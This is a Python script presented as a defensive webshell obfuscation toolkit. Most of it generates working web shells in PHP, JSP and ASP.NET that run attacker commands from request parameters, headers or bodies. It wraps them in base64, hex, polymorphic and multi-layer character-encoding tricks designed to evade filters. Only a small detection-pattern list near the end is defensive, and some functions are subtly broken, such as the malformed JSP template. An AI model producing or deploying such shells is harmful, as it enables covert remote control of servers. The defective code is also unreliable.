#!/usr/bin/env python3
"""
webshell-obfuscation: Webshell obfuscation toolkit for defensive testing
Based on techniques from https://github.com/tennc/webshell and security research
"""

import base64
import urllib.parse
import random
import string
import json
import re
from typing import List, Dict, Optional

# ============================================================================
# PHP OBUSCATION TECHNIQUES
# ============================================================================

def php_base64(webshell: str) -> str:
    """Wrap PHP code in base64 decode and eval."""
    encoded = base64.b64encode(webshell.encode()).decode()
    return f"<?php @eval(base64_decode('{encoded}'));?>"

def php_nested_base64(webshell: str, depth: int = 3) -> str:
    """Multiple layers of base64 encoding."""
    code = webshell
    for _ in range(depth):
        encoded = base64.b64encode(code.encode()).decode()
        code = f"base64_decode('{encoded}')"
    return f"<?php @eval({code});?>"

def php_hex_encoding(webshell: str) -> str:
    """Convert PHP code to hex strings."""
    hex_str = webshell.encode().hex()
    # Build the eval string manually
    parts = []
    for i in range(0, len(hex_str), 2):
        parts.append(f"\\x{hex_str[i:i+2]}")
    hex_eval = "'" + "".join(parts) + "'"
    return f"<?php @eval({hex_eval});?>"

def php_concatenation(webshell: str) -> str:
    """Break up function names and strings using concatenation."""
    # Remove existing PHP tags if present
    code = webshell.strip()
    if code.startswith('<?php'):
        code = re.sub(r'^<\?php\s*', '', code)
        code = re.sub(r'\?>\s*$', '', code)

    # Obfuscate key functions
    replacements = {
        'system': "sys" + "tem",
        'exec': "ex" + "ec",
        'passthru': "pas" + "sthru",
        'shell_exec': "shell" + "_exec",
        'eval': "ev" + "al",
        'assert': "ass" + "ert",
        'base64_decode': "base6" + "4_de" + "code",
        'file_put_contents': "file_" + "put_" + "contents",
        'file_get_contents': "file_" + "get_" + "contents",
        '_GET': '_' + 'GET',
        '_POST': '_' + 'POST',
        '_COOKIE': '_' + 'COOKIE',
        '_REQUEST': '_' + 'REQUEST',
    }

    result = code
    for orig, replacement in replacements.items():
        if orig.lower() in result.lower():
            pattern = re.compile(re.escape(orig), re.IGNORECASE)
            result = pattern.sub(replacement, result)

    return f"<?php {result}?>"

def php_variable_variables(webshell: str) -> str:
    """Use $$ and variable variables to obfuscate."""
    # Remove existing PHP tags if present
    code = webshell.strip()
    if code.startswith('<?php'):
        code = re.sub(r'^<\?php\s*', '', code)
        code = re.sub(r'\?>\s*$', '', code)

    # Simple obfuscation: replace $_GET with ${${...}}
    if '$_GET' in code:
        code = code.replace('$_GET', '${${"GET"}}')
    if '$_POST' in code:
        code = code.replace('$_POST', '${${"POST"}}')
    if '$_COOKIE' in code:
        code = code.replace('$_COOKIE', '${${"COOKIE"}}')
    return f"<?php {code}?>"

def php_hidden_input(webshell: str, param_name: str = None) -> str:
    """Use hidden form input instead of obvious parameter names."""
    if param_name is None:
        param_name = ''.join(random.choices(string.ascii_lowercase, k=8))

    # Wrap webshell to use the hidden parameter
    wrapped = f"<?php @eval($_POST['{param_name}']);?>"

    form = f"""<form method="post" action="">
<input type="hidden" name="{param_name}" value="{base64.b64encode(wrapped.encode()).decode()}">
</form>
<script>document.forms[0].submit();</script>"""

    return form

def php_polymorphic(webshell: str) -> str:
    """Create polymorphic webshell with random variables."""
    encoded = base64.b64encode(webshell.encode()).decode()
    var1 = ''.join(random.choices(string.ascii_lowercase, k=6))
    var2 = ''.join(random.choices(string.ascii_lowercase, k=6))

    return f"<?php ${var1}='{encoded}';${var2}=base64_decode(${var1});@{var2}(${var2});?>"

# ============================================================================
# JSP OBUSCATION TECHNIQUES
# ============================================================================

def jsp_unicode_escape(webshell: str) -> str:
    """Convert JSP code to Unicode escape sequences."""
    result = []
    for char in webshell:
        if char == '\n':
            result.append('\n')
        elif ord(char) > 127 or char in '<>%':
            result.append(f'\\u{ord(char):04x}')
        else:
            result.append(char)

    joined = ''.join(result)

    # Handle the <% tags specially
    if joined.startswith('<%'):
        return joined[:2] + '\\u003c' + '\\u007b' + joined[3:].replace('<%', '\\u003c\\u007b')

    return joined

def jsp_expression_direct(webshell: str) -> str:
    """Use JSP expression <%= %> directly for one-liners."""
    # This only works for simple commands that return a value
    return f"<%={webshell}%>"

def jsp_scriptlet_hidden(webshell: str) -> str:
    """Use <jsp:scriptlet> tag instead of <% to bypass some filters."""
    # Replace <% with <jsp:scriptlet>
    result = webshell.replace('<%', '<jsp:scriptlet>').replace('%>', '</jsp:scriptlet>')
    return result

def jsp_base64_input(webshell: str) -> str:
    """JSP webshell that reads base64 from request body."""
    code = webshell.replace("'", "\\'").replace("\n", " ")
    return f"""<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="java.io.*" %>
<%
String `{random.choices(string.ascii_lowercase, k=4)}` = request.getParameter("code");
if({random.choices(string.ascii_lowercase, k=4)} != null) {{
    String `{random.choices(string.ascii_lowercase, k=4)}` = new String(new BASE64Decoder().decodeBuffer({random.choices(string.ascii_lowercase, k=4)}));
    Runtime.getRuntime().exec({random.choices(string.ascii_lowercase, k=4)});
}}
%>"""

def jsp_reflection_api(webshell: str) -> str:
    """Use Java reflection API to dynamically invoke methods."""
    # Simplified reflection-based execution
    return f"""<%@ page import="java.lang.reflect.*" %>
<%@ page import="java.util.*" %>
<%
String cmd = request.getHeader("X-Command");
if(cmd != null) {{
    String[] cmds = cmd.split(" ");
    ProcessBuilder pb = new ProcessBuilder(cmds);
    Process p = pb.start();
    Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\\\A");
    out.println(s.hasNext() ? s.next() : "");
}}
%>"""

def jsp_script_engine(webshell: str) -> str:
    """Use Java ScriptEngine for dynamic code execution."""
    return f"""<%
javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByExtension("js");
engine.eval(new String(new sun.misc.BASE64Decoder().decodeBuffer(request.getInputStream())));
%>"""

# ============================================================================
# JSP MULTI-ENCODING TECHNIQUES (from Y4tacker blog)
# Based on Tomcat JSP parsing: BOM -> xml encoding -> pageEncoding
# ============================================================================

def jsp_xml_encoding(webshell: str, encoding: str = 'utf-16be') -> tuple:
    """
    JSP with xml declaration encoding.
    Uses <?xml version="1.0" encoding='xxx'?> to specify encoding.
    The xml declaration must appear first after decoding.

    Returns tuple: (binary_content, description)
    """
    xml_header = f'<?xml version="1.0" encoding=\'{encoding}\'?>'.encode(encoding)
    jsp_content = webshell.encode(encoding)
    return xml_header + jsp_content, f"xml_declaration+{encoding}"

def jsp_page_encoding(webshell: str, encoding: str = 'utf-16be') -> tuple:
    """
    JSP with pageEncoding directive.
    Uses <%@ page pageEncoding="xxx"%> to specify encoding.
    This can be placed anywhere in the file content.
    """
    # Split the webshell into parts to demonstrate flexible placement
    parts = webshell.split('\n')
    if len(parts) > 2:
        # Place pageEncoding in the middle (demonstrates flexibility)
        mid = len(parts) // 2
        header = '\n'.join(parts[:mid]).encode(encoding)
        page_directive = f'<%@ page pageEncoding="{encoding}"%>'.encode(encoding)
        footer = '\n'.join(parts[mid:]).encode(encoding)
        return header + page_directive + footer, f"pageEncoding_directive+{encoding}"
    else:
        page_directive = f'<%@ page pageEncoding="{encoding}"%>\n'.encode(encoding)
        return page_directive + webshell.encode(encoding), f"pageEncoding_directive+{encoding}"

def jsp_page_directive_alt(webshell: str, encoding: str = 'utf-16be') -> tuple:
    """
    JSP with alternative page directive syntax.
    Uses <jsp:directive.page pageEncoding="xxx"/> or contentType.
    """
    directive = f'<jsp:directive.page pageEncoding="{encoding}"/>\n'.encode(encoding)
    return directive + webshell.encode(encoding), f"jsp_directive_page+{encoding}"

def jsp_double_encoding_bom_xml(webshell: str, bom_enc: str = 'utf-8', xml_enc: str = 'cp037') -> tuple:
    """
    Double encoding: BOM detection + xml encoding declaration.
    - BOM (3 bytes for utf-8) identifies initial encoding
    - <?xml encoding='xxx'?> overrides the encoding for rest of file

    Supported BOM encodings: utf-8, utf-16be, utf-16le, iso-10646-ucs-4, cp037
    """
    # BOM for utf-8 is EF BB BF
    if bom_enc == 'utf-8':
        bom = b'\xef\xbb\xbf'
    elif bom_enc == 'utf-16be':
        bom = b'\xfe\xff'
    elif bom_enc == 'utf-16le':
        bom = b'\xff\xfe'
    else:
        bom = b''

    xml_header = f'<?xml version="1.0" encoding=\'{xml_enc}\'?>'.encode(bom_enc)
    jsp_content = webshell.encode(xml_enc)

    return bom + xml_header + jsp_content, f"bom_{bom_enc}+xml_{xml_enc}"

def jsp_double_encoding_bom_page(webshell: str, bom_enc: str = 'utf-8', page_enc: str = 'utf-16be') -> tuple:
    """
    Double encoding: BOM detection + pageEncoding directive.
    - BOM identifies initial encoding
    - pageEncoding attribute overrides for rest of file
    """
    if bom_enc == 'utf-8':
        bom = b'\xef\xbb\xbf'
    elif bom_enc == 'utf-16be':
        bom = b'\xfe\xff'
    elif bom_enc == 'utf-16le':
        bom = b'\xff\xfe'
    else:
        bom = b''

    page_directive = f'<%@ page pageEncoding="{page_enc}"%>'.encode(bom_enc)
    jsp_content = webshell.encode(page_enc)

    return bom + page_directive + jsp_content, f"bom_{bom_enc}+page_{page_enc}"

def jsp_triple_encoding(webshell: str, bom_enc: str = 'utf-8', xml_enc: str = 'cp037', page_enc: str = 'utf-16be') -> tuple:
    """
    Triple encoding: BOM + xml encoding + pageEncoding.
    - BOM (utf-8) -> identifies initial encoding
    - <?xml encoding='cp037'?> -> overrides to cp037 for xml declaration
    - <%@ page pageEncoding="utf-16be"%> -> overrides to utf-16be for rest

    Note: Total length considerations - even byte count for multi-byte encodings!
    """
    # BOM
    if bom_enc == 'utf-8':
        bom = b'\xef\xbb\xbf'
    elif bom_enc == 'utf-16be':
        bom = b'\xfe\xff'
    elif bom_enc == 'utf-16le':
        bom = b'\xff\xfe'
    else:
        bom = b''

    # xml encoding declaration
    xml_header = f'<?xml version="1.0" encoding=\'{xml_enc}\'?>'.encode(bom_enc)

    # JSP content part 1 (before pageEncoding directive)
    parts = webshell.split('\n')
    if len(parts) > 3:
        mid = len(parts) // 3
        jsp_part1 = '\n'.join(parts[:mid]).encode(xml_enc)
    else:
        jsp_part1 = b''

    # pageEncoding directive (encoded in xml_enc)
    page_directive = f'<%@ page pageEncoding="{page_enc}"%>'.encode(xml_enc)

    # JSP content part 2 (after pageEncoding directive)
    if len(parts) > 3:
        jsp_part2 = '\n'.join(parts[mid:]).encode(page_enc)
    else:
        jsp_part2 = webshell.encode(page_enc)

    return bom + xml_header + jsp_part1 + page_directive + jsp_part2, f"bom_{bom_enc}+xml_{xml_enc}+page_{page_enc}"

def jsp_xml_format(webshell: str, encoding: str = 'utf-8') -> tuple:
    """
    Full JSP XML format webshell (.jspx style).
    Uses <jsp:root> structure with proper xmlns.
    """
    xml_template = f'''<?xml version="1.0" encoding="{encoding}"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:directive.page contentType="text/html"/>
    <jsp:declaration>
    </jsp:declaration>
    <jsp:scriptlet>
{webshell}
    </jsp:scriptlet>
    <jsp:text>
    </jsp:text>
</jsp:root>'''
    return xml_template.encode(encoding), f"xml_format+{encoding}"

# ============================================================================
# ASP.NET OBUSCATION TECHNIQUES
# ============================================================================

def aspx_hidden_namespace(webshell: str) -> str:
    """Use unusual namespaces and class names in ASP.NET."""
    return f"""<%@ WebService Language="C#" Class="_{''.join(random.choices(string.ascii_uppercase, k=6))}" %>
using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Web.SessionState;

{webshell}"""

def aspx_soap_format(webshell: str) -> str:
    """ASMX SOAP format webshell (existing cmd.asmx style)."""
    return """<%--
Usage:
POST /test.asmx/Test HTTP/1.1
Host: example.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/Test"
--%>

<%@ WebService Language="C#" Class="Service" %>
using System;
using System.Web;
using System.IO;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Web.SessionState;
using System.Web.Services;
using System.Xml;

[WebService(Namespace = "http://www.payloads.online/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]

public class Service : WebService
{
    [WebMethod]
    public string Test(string Z1, string Z2)
    {
        ProcessStartInfo c = new ProcessStartInfo(Z1, Z2);
        c.UseShellExecute = false;
        c.RedirectStandardOutput = true;
        c.RedirectStandardError = true;
        Process e = Process.Start(c);
        StreamReader OT = e.StandardOutput;
        StreamReader ER = e.StandardError;
        e.Close();
        string R = OT.ReadToEnd() + ER.ReadToEnd();
        HttpContext.Current.Response.Write(R);
        return R;
    }
}"""

def aspx_handler_ashx(webshell: str) -> str:
    """ASP.NET Generic Handler (.ashx) format."""
    return f"""<%@ WebHandler Language="C#" Class="Handler" %>
using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Web.SessionState;

public class Handler : IHttpHandler, IRequiresSessionState
{{
    public void ProcessRequest(HttpContext context)
    {{
        {webshell}
    }}

    public bool IsReusable
    {{
        get {{ return false; }}
    }}
}}"""

# ============================================================================
# DETECTION PATTERNS
# ============================================================================

DETECTION_PATTERNS = {
    'EVAL_BASE64': {
        'pattern': r'(eval|assert)\s*\(\s*(base64_decode|gzinflate|str_rot13)',
        'description': 'eval with encoded code execution',
        'severity': 'high',
        'lang': 'php'
    },
    'SYSTEM_EXEC': {
        'pattern': r'(system|exec|passthru|shell_exec|proc_open|popen)\s*\(',
        'description': 'Direct command execution function',
        'severity': 'high',
        'lang': 'php'
    },
    'HIDDEN_INPUT': {
        'pattern': r'<input\s+[^>]*type\s*=\s*["\']?hidden["\']?',
        'description': 'Hidden form input (potential webshell)',
        'severity': 'medium',
        'lang': 'html'
    },
    'SCRIPT_ENGINE': {
        'pattern': r'ScriptEngine(Manager)?\s*\(',
        'description': 'Java ScriptEngine for dynamic eval',
        'severity': 'high',
        'lang': 'java'
    },
    'REFLECTION_API': {
        'pattern': r'getDeclaredField\s*\(\s*["\']theUnsafe["\']',
        'description': 'Unsafe reflection (bypass RASP)',
        'severity': 'high',
        'lang': 'java'
    },
    'PROCESS_BUILDER': {
        'pattern': r'ProcessBuilder\s*\(|new\s+Process\s*\(',
        'description': 'Process creation for command execution',
        'severity': 'medium',
        'lang': 'java'
    },
    'WEBSERVICE_ASMX': {
        'pattern': r'\[WebService\]|\[WebMethod\]',
        'description': 'ASP.NET WebService attribute',
        'severity': 'low',
        'lang': 'csharp'
    },
    'UNICODE_ESCAPE': {
        'pattern': r'\\u[0-9a-fA-F]{{4}}',
        'description': 'Unicode escape sequence',
        'severity': 'low',
        'lang': 'jsp'
    },
    'OBFUSCATED_VAR': {
        'pattern': r'\\$\\$[a-zA-Z_]|\\${{[^}}]+}}',
        'description': 'Variable variables or double-dollar obfuscation',
        'severity': 'medium',
        'lang': 'php'
    },
    'ENCODED_PAYLOAD': {
        'pattern': r"(base64_decode|gzinflate|str_rot13|urldecode)\s*\([^)]*\)\s*;?\s*(eval|assert|include|require)",
        'description': 'Multi-stage encoded payload',
        'severity': 'high',
        'lang': 'php'
    },
}

def detect(content: str) -> List[Dict]:
    """Detect known webshell patterns in code."""
    results = []
    for name, info in DETECTION_PATTERNS.items():
        matches = re.finditer(info['pattern'], content, re.IGNORECASE)
        for match in matches:
            results.append({
                'pattern': name,
                'description': info['description'],
                'severity': info['severity'],
                'language': info['lang'],
                'match': match.group(),
                'position': match.start()
            })
    return results

# ============================================================================
# MAIN OBFUSCATION FUNCTIONS
# ============================================================================

LANG_TECHNIQUES = {
    'php': [
        ('base64', php_base64),
        ('nested_base64', php_nested_base64),
        ('hex', php_hex_encoding),
        ('concat', php_concatenation),
        ('variable_var', php_variable_variables),
        ('polymorphic', php_polymorphic),
    ],
    'jsp': [
        ('unicode', jsp_unicode_escape),
        ('scriptlet', jsp_scriptlet_hidden),
        ('reflection', jsp_reflection_api),
        ('script_engine', jsp_script_engine),
        ('xml_encoding', jsp_xml_encoding),
        ('page_encoding', jsp_page_encoding),
        ('jsp_directive_page', jsp_page_directive_alt),
        ('double_bom_xml', jsp_double_encoding_bom_xml),
        ('double_bom_page', jsp_double_encoding_bom_page),
        ('triple_encoding', jsp_triple_encoding),
        ('xml_format', jsp_xml_format),
    ],
    'aspx': [
        ('hidden_ns', aspx_hidden_namespace),
        ('soap', aspx_soap_format),
        ('handler', aspx_handler_ashx),
    ],
    'java': [
        ('reflection', jsp_reflection_api),
        ('script_engine', jsp_script_engine),
    ],
}

def obfuscate(
    webshell: str,
    language: str = 'php',
    technique: str = 'all',
    level: int = 2
) -> List[Dict]:
    """
    Obfuscate a webshell using various techniques.

    Args:
        webshell: The raw webshell code
        language: 'php', 'jsp', 'aspx', or 'java'
        technique: Specific technique name or 'all'
        level: Obfuscation level 1-3

    Returns:
        List of obfuscated webshell variants
    """
    results = []

    techniques = LANG_TECHNIQUES.get(language.lower(), [])

    if technique == 'all':
        for name, func in techniques:
            try:
                result = func(webshell)
                # Handle tuple returns (binary content, description)
                if isinstance(result, tuple):
                    binary_content, desc = result
                    results.append({
                        'technique': name,
                        'language': language,
                        'description': desc,
                        'code': binary_content.decode('latin-1', errors='replace') if isinstance(binary_content, bytes) else binary_content,
                        'binary': binary_content.hex() if isinstance(binary_content, bytes) else None,
                        'is_binary': isinstance(binary_content, bytes)
                    })
                else:
                    results.append({
                        'technique': name,
                        'language': language,
                        'code': result
                    })
            except Exception as e:
                results.append({
                    'technique': name,
                    'error': str(e)
                })
    else:
        for name, func in techniques:
            if name == technique:
                result = func(webshell)
                if isinstance(result, tuple):
                    binary_content, desc = result
                    results.append({
                        'technique': name,
                        'language': language,
                        'description': desc,
                        'code': binary_content.decode('latin-1', errors='replace') if isinstance(binary_content, bytes) else binary_content,
                        'binary': binary_content.hex() if isinstance(binary_content, bytes) else None,
                        'is_binary': isinstance(binary_content, bytes)
                    })
                else:
                    results.append({
                        'technique': name,
                        'language': language,
                        'code': result
                    })
                break
        else:
            return [{'error': f'Unknown technique: {technique} for language: {language}'}]

    return results

def list_techniques(language: str = None) -> Dict:
    """List all available techniques."""
    if language:
        return {language: [name for name, _ in LANG_TECHNIQUES.get(language.lower(), [])]}
    return {lang: [name for name, _ in techs] for lang, techs in LANG_TECHNIQUES.items()}

# ============================================================================
# CLI
# ============================================================================

if __name__ == '__main__':
    import sys

    if len(sys.argv) < 2:
        print("Usage: webshell_obfuscation.py <webshell_code> [options]")
        print("Options:")
        print("  --lang <php|jsp|aspx|java>")
        print("  --technique <name>")
        print("  --level <1-3>")
        print("  --detect")
        print("  --list")
        sys.exit(1)

    code = sys.argv[1]

    if '--list' in sys.argv:
        print(json.dumps(list_techniques(), indent=2))
    elif '--detect' in sys.argv:
        results = detect(code)
        print(json.dumps(results, indent=2))
    else:
        lang = 'php'
        technique = 'all'
        level = 2

        if '--lang' in sys.argv:
            idx = sys.argv.index('--lang')
            if idx + 1 < len(sys.argv):
                lang = sys.argv[idx + 1]

        if '--technique' in sys.argv:
            idx = sys.argv.index('--technique')
            if idx + 1 < len(sys.argv):
                technique = sys.argv[idx + 1]

        if '--level' in sys.argv:
            idx = sys.argv.index('--level')
            if idx + 1 < len(sys.argv):
                level = int(sys.argv[idx + 1])

        results = obfuscate(code, lang, technique, level)
        print(json.dumps(results, indent=2))
